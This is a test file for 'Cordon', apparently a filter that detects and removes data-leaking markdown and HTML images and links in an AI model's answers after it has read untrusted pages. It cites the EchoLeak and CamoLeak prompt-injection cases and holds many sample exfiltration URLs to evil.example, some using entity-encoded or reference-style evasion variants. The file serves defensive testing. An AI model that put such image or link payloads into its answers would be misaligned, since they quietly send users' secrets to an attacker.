import { describe, expect, it } from 'vitest'
import { cutOutbound, outbound, outboundAfterRead } from '../../src/output/egress.js'
import { DEFAULT_POLICY } from '../../src/policy/defaults.js'
import { TaintStore } from '../../src/provenance/store.js'

// Nothing is known: the model composed every link itself.
const nobody = () => null

describe('outbound: what in an answer would send data out when shown', () => {
  it('an image loads by itself, so any image counts', () => {
    // EchoLeak and CamoLeak: the image fetch is the exfiltration, no click.
    const found = outbound('Done. ![status](https://evil.example/p.png?d=c2VjcmV0)', nobody)
    expect(found).toHaveLength(1)
    expect(found[0]).toMatchObject({ kind: 'image', host: 'evil.example' })
  })

  it('an image copied verbatim from a page still counts', () => {
    // CamoLeak's images were pre-signed by the page, one per character; the
    // order the model emitted them in was the secret.
    const found = outbound('![a](https://camo.example/abc)', () => 'source')
    expect(found).toHaveLength(1)
  })

  it('an image the user named passes', () => {
    expect(outbound('![logo](https://acme.example/logo.png)', () => 'user')).toEqual([])
  })

  it('an HTML image counts too, by src or srcset', () => {
    expect(outbound('<img src="https://evil.example/x?k=1">', nobody)).toHaveLength(1)
    expect(outbound('<img srcset="https://evil.example/x 1x">', nobody)).toHaveLength(1)
  })

  it('an image address spelled with an entity is still an image', () => {
    // Codex review: markdown-it decodes &#58; and fetches the image.
    expect(outbound('![s](https&#58;//evil.example/p.png?secret=abc123)', nobody)).toHaveLength(1)
  })

  it('a shortcut or collapsed reference image counts', () => {
    const shortcut = outbound('![pixel]\n\n[pixel]: https://evil.example/x.png', () => 'source')
    expect(shortcut.map((item) => item.kind)).toContain('image')
    expect(outbound('![pixel][]\n\n[pixel]: https://evil.example/x.png', nobody).map((item) => item.kind)).toContain('image')
  })

  it('an escaped bracket in the alt text does not hide the image', () => {
    const found = outbound('![a\\]b](https://evil.example/x.png)', nobody)
    expect(found.map((item) => item.kind)).toEqual(['image'])
  })

  it('an address inside code is text, not a fetch', () => {
    // A code block is not rendered, and cutting it would destroy an example.
    expect(outbound('```\n![s](https://evil.example/p.png?d=1)\n```', nobody)).toEqual([])
    expect(outbound('use `![s](https://evil.example/p.png?d=1)` to embed', nobody)).toEqual([])
  })

  it('a reference-style image counts', () => {
    expect(outbound('![x][r]\n\n[r]: https://evil.example/x?k=1', nobody).map((item) => item.kind)).toContain('image')
  })

  it('a composed link carrying a query counts', () => {
    const found = outbound('See [the docs](https://evil.example/c?q=the+api+key+is+abc)', nobody)
    expect(found).toHaveLength(1)
    expect(found[0]).toMatchObject({ kind: 'link', host: 'evil.example' })
  })

  it('a composed link carrying an identifier in its path counts', () => {
    expect(outbound('<https://evil.example/c/a8f3k29dm4x7q1z0>', nobody)).toHaveLength(1)
    expect(outbound('go to https://evil.example/c#tok9x8y7z6', nobody)).toHaveLength(1)
  })

  it('a composed link carrying data before its host counts', () => {
    expect(outbound('https://sk-live-9f8e7d@evil.example/', nobody)).toHaveLength(1)
  })

  it('a plain link to a host the user named passes: that is how answers cite things', () => {
    const userHosts = (host: string) => host === 'docs.python.org' || host === 'nodejs.org'
    expect(outbound('See [os](https://docs.python.org/3/library/os.html) and https://nodejs.org/api/fs.html', nobody, userHosts)).toEqual([])
  })

  it('a composed link to a host the user never named counts, data or not', () => {
    // Both reviews: the host itself carries data (`secret123.evil.example`),
    // and a path of plain words carries it too. The page can name its own
    // host, so a host seen only in what was read vouches for nothing.
    expect(outbound('[Continue](https://secret123.evil.example/)', nobody)).toHaveLength(1)
    expect(outbound('[details](https://evil.example/api-key-sk-proj-abcdef)', nobody)).toHaveLength(1)
  })

  it('a link to a named host still counts when it carries data', () => {
    const userHosts = (host: string) => host === 'docs.python.org'
    expect(outbound('[x](https://docs.python.org/search?q=secret)', nobody, userHosts)).toHaveLength(1)
  })

  it('a link copied verbatim from what was read passes: it carries only the page', () => {
    expect(outbound('[result](https://shop.example/item?id=42)', () => 'source')).toEqual([])
  })

  it('a link the user named passes', () => {
    expect(outbound('[x](https://acme.example/r?id=7)', () => 'user')).toEqual([])
  })
})

describe('outboundAfterRead: the session decides whether any of it applies', () => {
  const answer = '![s](https://evil.example/p.png?d=1) and [docs](https://shop.example/item?id=42)'

  it('a session that read nothing untrusted leaves the answer alone', () => {
    expect(outboundAfterRead(answer, { taint: new TaintStore(), exposure: null }, DEFAULT_POLICY)).toEqual([])
  })

  it('after an untrusted read, the image goes and the link copied from the page stays', () => {
    const taint = new TaintStore()
    taint.record('Buy it at https://shop.example/item?id=42 today', { id: 'w', kind: 'web', label: 'shop', trust: 'untrusted' })
    const found = outboundAfterRead(answer, { taint, exposure: { at: 1, source: 'shop' } }, DEFAULT_POLICY)
    expect(found.map((item) => item.kind)).toEqual(['image'])
  })

  it('a composed link does not borrow standing from an identifier the page said', () => {
    const taint = new TaintStore()
    taint.record('your session is sess1234abcd', { id: 'w', kind: 'web', label: 'p', trust: 'untrusted' })
    const composed = '[x](https://evil.example/c?d=secret&s=sess1234abcd)'
    expect(outboundAfterRead(composed, { taint, exposure: { at: 1, source: 'p' } }, DEFAULT_POLICY)).toHaveLength(1)
  })

  it('a link copied from the page in another case is still the page\'s', () => {
    const taint = new TaintStore()
    taint.record('See https://Shop.example/Item?id=42', { id: 'w', kind: 'web', label: 'p', trust: 'untrusted' })
    expect(outboundAfterRead('[x](https://Shop.example/Item?id=42)', { taint, exposure: { at: 1, source: 'p' } }, DEFAULT_POLICY)).toEqual([])
  })

  it('a plain link to a host the user named passes after the read', () => {
    const found = outboundAfterRead('see https://docs.python.org/3/library/os.html', {
      taint: new TaintStore(), exposure: { at: 1, source: 'p' }, userAtoms: ['https://docs.python.org/3/'],
    }, DEFAULT_POLICY)
    expect(found).toEqual([])
  })

  it('an address the user wrote passes', () => {
    const found = outboundAfterRead(answer, { taint: new TaintStore(), exposure: { at: 1, source: 'x' }, userAtoms: ['https://evil.example/p.png?d=1', 'https://shop.example/item?id=42'] }, DEFAULT_POLICY)
    expect(found).toEqual([])
  })

  it('exposure: false switches it off with the rule it belongs to', () => {
    const policy = { ...DEFAULT_POLICY, exposure: false }
    expect(outboundAfterRead(answer, { taint: new TaintStore(), exposure: { at: 1, source: 'x' } }, policy)).toEqual([])
  })
})

describe('cutOutbound: the answer with those removed', () => {
  it('replaces an image with a note naming the host', () => {
    const answer = 'Done. ![status](https://evil.example/p.png?d=c2VjcmV0) Bye.'
    const cut = cutOutbound(answer, outbound(answer, nobody))
    expect(cut).toBe('Done. [image removed by Cordon: evil.example] Bye.')
  })

  it('keeps a link\'s text and drops its address', () => {
    const answer = 'See [the docs](https://evil.example/c?q=abc).'
    expect(cutOutbound(answer, outbound(answer, nobody))).toBe('See the docs [link removed by Cordon: evil.example].')
  })

  it('does not let the host reshape the note', () => {
    const answer = '![a](https://evil.example](x)/p.png?d=1)'
    const cut = cutOutbound(answer, outbound(answer, nobody))
    expect(cut).not.toContain('https://')
  })

  it('leaves an answer with nothing to cut unchanged', () => {
    expect(cutOutbound('plain text', [])).toBe('plain text')
  })
})
